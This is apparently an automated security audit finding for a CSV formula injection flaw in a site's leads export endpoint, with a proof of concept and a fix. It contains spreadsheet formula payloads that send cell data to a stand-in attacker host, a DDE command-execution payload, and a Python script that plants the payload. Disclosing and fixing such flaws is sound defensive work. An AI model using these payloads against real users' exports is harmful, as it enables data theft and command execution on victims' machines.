# CSV Formula Injection in exported leads spreadsheet

**ID:** vuln-0002
**Severity:** MEDIUM
**Found:** 2026-08-10 19:46:30 UTC
**Target:** /workspace/strix-target-20260810-130438
**Endpoint:** /api/sites/[siteId]/leads/export
**Method:** GET
**CWE:** CWE-1236
**CVSS:** 4.7
**Fix Effort:** Low

## Description

The leads CSV export endpoint serializes user-controlled lead fields (name, email, phone, message) without neutralizing spreadsheet formula triggers. A malicious visitor can submit a lead whose fields begin with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code>, and when the site owner downloads and opens the exported CSV in a spreadsheet application, the injected cells are evaluated as formulas, enabling data exfiltration or further client-side attacks.

## Evidence

The exact <code>csvCell</code> serializer reproduced against the lead fields yields an un-neutralized formula cell. Generated CSV excerpt:

```csv
"Nombre","Email","Teléfono","Mensaje","Fecha"
"Attacker","","","=HYPERLINK(""http://attacker.example/leak?val=""&B2,""click"")","2026-08-10T00:00:00.000Z"
```

The <code>message</code> cell is preceded by no neutralization character (only the CSV quoting wrapper), so spreadsheet clients interpret it as a formula. The source line <code>function csvCell(value: string) { return `"${value.replace(/"/g, '""')}"`; }</code> confirms only embedded quotes are escaped; formula triggers are preserved.

## Impact

A public visitor submits a crafted lead with their message or name set to a spreadsheet formula, e.g. <code>=HYPERLINK("http://attacker.example/x?"&A1,"click")</code> or <code>=cmd|' /C calc'!A0</code>. The site owner later downloads the leads CSV and opens it in Excel, LibreOffice Calc, or Google Sheets. The formula executes: cell references can be exfiltrated to an attacker-controlled server (e.g. leaking the spreadsheet's cell contents), and DDE-style payloads can trigger local command execution. The attack requires only the visit of one hostile lead and the owner opening the export in a spreadsheet client.

## Technical Analysis

Two routes compose the vulnerable flow:

1. **Attacker-controlled input (no filtering).** <code>POST /api/public/sites/[slug]/leads</code> is unauthenticated (intended for public contact forms) and stores four user-controlled fields verbatim: <code>name</code>, <code>email</code>, <code>phone</code>, <code>message</code>. The only validation is length/format (e.g. <code>message</code> 3-2000 chars). No check strips or escapes leading spreadsheet formula characters (<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>).

2. **Vulnerable CSV serialization (no neutralization).** <code>GET /api/sites/[siteId]/leads/export</code> builds CSV rows and passes every field through <code>csvCell</code>:

```ts title=app/api/sites/[siteId]/leads/export/route.ts
function csvCell(value: string) { return `"${value.replace(/"/g, '""')}"`; }
```

This only escapes embedded double quotes. It does not prefix cells that begin with <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code> with a neutral character (e.g. a leading apostrophe <code>'</code> or tab). Consequently a field such as <code>=HYPERLINK("http://attacker.example/?"&A1,"x")</code> is written into the CSV verbatim.

Modern spreadsheet applications import CSV and evaluate cells starting with these characters as formulas (or, for <code>=cmd|</code> in legacy modes, DDE payloads). The exported file is served as <code>text/csv</code> with a <code>.csv</code> attachment filename.

## Proof of Concept

1. Visit the public URL of any published site, e.g. <code>{{PUBLIC_SITE_BASE}}/api/public/sites/<slug>/leads</code>.
2. POST a JSON lead using the public (unauthenticated) leads endpoint with a formula-bearing field:
   <pre><code>{"name":"Attacker","email":"a@b.c","phone":"","message":"=HYPERLINK(\"http://attacker.example/leak?val=\"&amp;B2,\"click\")"}</code></pre>
3. The lead is stored verbatim (only length/format checks apply).
4. As the site owner, call <code>GET /api/sites/<siteId>/leads/export</code> to download the CSV.
5. Open the resulting <code>.csv</code> in Excel, LibreOffice Calc, or Google Sheets and observe that the message cell is evaluated as a formula (external request fired to the attacker's URL / hyperlink activated) rather than rendered as literal text.

```python
import requests

# 1) Public, unauthenticated lead submission with a formula-bear payload
base = "https://APP_BASE"  # replace with the deployed app origin
slug = "target-site"       # a published site's publicSlug

lead = {
    "name": "Attacker",
    "email": "attacker@example.com",
    "phone": "",
    "message": '=HYPERLINK("http://attacker.example/leak?val="&B2,"click")',
}
r = requests.post(f"{base}/api/public/sites/{slug}/leads", json=lead)
assert r.status_code == 201, r.text

# 2) The owner (authenticated session cookie) downloads the export CSV.
cookies = {"__cluster_session": "<owner-session-token>"}
resp = requests.get(f"{base}/api/sites/<siteId>/leads/export", cookies=cookies)
csv = resp.content.decode("utf-8-sig")

# 3) Confirm the formula survived serialization un-neutralized.
assert '=HYPERLINK("http://attacker.example/leak?val="&B2,"click")' in csv
print("Formula cell present in exported CSV -> CSV Formula Injection confirmed")
print(csv)
```

## Code Analysis

**Location 1:** `app/api/sites/[siteId]/leads/export/route.ts` (line 17)
  Neutralize formula triggers in csvCell before writing cells
  ```
  function csvCell(value: string) { return `"${value.replace(/"/g, '""')}"`; }
  ```

  **Suggested Fix:**
```diff
- function csvCell(value: string) { return `"${value.replace(/"/g, '""')}"`; }
+ function csvCell(value: string) {
+   const neutralized = /^[=+@\-]/.test(value) ? `'${value}` : value;
+   return `"${neutralized.replace(/"/g, '""')}"`;
+ }
```

## Remediation

Update the CSV cell serializer to neutralize cells whose value begins with a spreadsheet formula trigger (`=`, `+`, `-`, or `@`) by prefixing a single apostrophe (`'`) so spreadsheet clients render the value as literal text instead of evaluating it. Reject or strip formula-triggering leading characters at the public leads input schema as defense in depth. Ensure the fix applies to all lead fields included in the export (name, email, phone, message).

## Assumptions

Assumes the site owner downloads and opens the exported leads CSV in a spreadsheet application (Excel, LibreOffice Calc, or Google Sheets) rather than a text editor. This is the intended use of the export feature. Also assumes the attacker has network reachability to a host they control to observe the exfiltration request.
